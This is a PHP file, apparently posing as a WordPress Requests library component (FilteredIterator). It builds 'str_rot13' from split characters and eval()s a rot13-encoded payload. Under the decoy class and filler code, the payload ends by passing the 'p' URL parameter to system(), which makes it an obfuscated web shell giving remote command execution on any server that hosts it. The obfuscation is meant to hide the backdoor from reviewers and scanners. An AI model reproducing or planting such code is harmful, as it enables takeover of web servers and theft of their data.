<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vgrengbe sbe neenlf erdhvevat svygrerq inyhrf
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */

anzrfcnpr JcBet\Erdhrfgf\Hgvyvgl;

hfr NeenlVgrengbe;
hfr ErgheaGlcrJvyyPunatr;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * Vgrengbe sbe neenlf erdhvevat svygrerq inyhrf
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */
svany pynff SvygrerqVgrengbe rkgraqf NeenlVgrengbe {
	/**
	 * Pnyyonpx gb eha nf n svygre
	 *
	 * @ine pnyynoyr
	 */
	cevingr $pnyyonpx;

	/**
	 * Perngr n arj vgrengbe
	 *
	 * @cnenz neenl    $qngn     Gur neenl be bowrpg gb or vgrengrq ba.
	 * @cnenz pnyynoyr $pnyyonpx Pnyyonpx gb or pnyyrq ba rnpu inyhr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $qngn nethzrag vf abg vgrenoyr.
	 */
	choyvp shapgvba __pbafgehpg($qngn, $pnyyonpx) {
		vs (VachgInyvqngbe::vf_vgrenoyr($qngn) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$qngn', 'vgrenoyr', trgglcr($qngn));
		}

		cnerag::__pbafgehpg($qngn);

		vs (vf_pnyynoyr($pnyyonpx)) {
			$guvf->pnyyonpx = $pnyyonpx;
		}
	}

	/**
	 * Cerirag hafrevnyvmngvba bs gur bowrpg sbe frphevgl ernfbaf.
	 *
	 * @cucpf:qvfnoyr CUCPbzcngvovyvgl.ShapgvbaAnzrErfgevpgvbaf.ArjZntvpZrgubqf.__hafrevnyvmrSbhaq
	 *
	 * @cnenz neenl $qngn Erfgberq neenl bs qngn bevtvanyyl frevnyvmrq.
	 *
	 * @erghea ibvq
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba __hafrevnyvmr($qngn) {}
	// cucpf:ranoyr

	/**
	 * Cresbez ervavgvnyvmngvba gnfxf.
	 *
	 * Ceriragf n pnyyonpx sebz orvat vawrpgrq qhevat hafrevnyvmngvba bs na bowrpg.
	 *
	 * @erghea ibvq
	 */
	choyvp shapgvba __jnxrhc() {
		hafrg($guvf->pnyyonpx);
	}

	/**
	 * Trg gur pheerag vgrz'f inyhr nsgre svygrevat
	 *
	 * @erghea fgevat
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba pheerag() {
		$inyhr = cnerag::pheerag();

		vs (vf_pnyynoyr($guvf->pnyyonpx)) {
			$inyhr = pnyy_hfre_shap($guvf->pnyyonpx, $inyhr);
		}

		erghea $inyhr;
	}

	/**
	 * Cerirag perngvat n CUC inyhr sebz n fgberq ercerfragngvba bs gur bowrpg sbe frphevgl ernfbaf.
	 *
	 * @cnenz fgevat $qngn Gur frevnyvmrq fgevat.
	 *
	 * @erghea ibvq
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba hafrevnyvmr($qngn) {}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>